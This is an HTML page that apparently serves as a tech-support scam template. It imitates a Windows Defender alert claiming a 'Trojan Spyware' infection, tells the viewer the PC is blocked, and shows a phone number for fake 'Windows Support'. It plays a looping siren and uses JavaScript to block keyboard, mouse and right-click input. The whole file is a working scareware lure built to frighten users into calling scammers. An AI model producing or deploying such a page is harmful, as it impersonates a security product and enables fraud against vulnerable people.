<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows Defender Security Alert</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f0f0;
        }
        .popup {
            width: 450px;
            padding: 20px;
            background-color: white;
            border: 3px solid red;
            box-shadow: 0px 0px 15px gray;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: none;
            text-align: left;
            z-index: 9999;
        }
        .popup h2 {
            color: red;
            margin: 0;
        }
        .popup p {
            color: black;
        }
        .popup button {
            padding: 10px;
            margin: 5px;
            background-color: red;
            color: white;
            border: none;
            cursor: pointer;
        }
        .popup .allow {
            background-color: blue;
        }
        /* Fullscreen overlay to block interaction */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 9998;
            display: none;
        }
    </style>
</head>
<body>
    <button onclick="showPopup()">Show Windows Defender Alert</button><div class="overlay" id="blockScreen"></div>

<div class="popup" id="alertPopup">
    <h2>Windows Defender Security Center</h2>
    <p><b>App:</b> Ads.fiancetrack(2).dll</p>
    <p><b>Threat Detected:</b> Trojan Spyware</p>
    <p>Access to this PC has been blocked for security reasons.</p>
    <p><b>Contact Windows Support:</b> +1-866-914-0330 (Toll-Free)</p>

</div>

    <audio id="alertSound" autoplay loop>
       <source src="‪C:\Users\admin\Downloads\sci-fi-warning-siren-jam-fx-1-00-28.mp3" type="audio/MPEG"></source>
       <source src="‪C:\Users\admin\Downloads\sci-fi-warning-siren-jam-fx-1-00-28.wav" type="audio/WAV"></source>
       <source src="‪C:\Users\admin\Downloads\sci-fi-warning-siren-jam-fx-1-00-28.ogg" type="audio/OGG"></source>  
          Your browser does not support the audio element.  
    </audio>

<script>
    function showPopup() {
        document.getElementById("alertPopup").style.display = "block";
        document.getElementById("blockScreen").style.display = "block";
        document.getElementById("alertSound").play();
        
        // Disable keyboard and mouse
        document.addEventListener("keydown", disableInput);
        document.addEventListener("mousedown", disableInput);
        document.addEventListener("contextmenu", disableInput);
    }		

    function closePopup() {
        document.getElementById("alertPopup").style.display = "none";
        document.getElementById("blockScreen").style.display = "none";
        document.getElementById("alertSound").pause();
        
        // Disable keyboard and mouse
        document.removeEventListener("keydown", disableInput);
        document.removeEventListener("mousedown", disableInput);
        document.removeEventListener("contextmenu", disableInput);
    }

    function disableInput(event) {
        if (event.key === "Tab") {
            closePopup();
        } else {
            event.preventDefault();
        }
    }
</script>

</body>
</html>
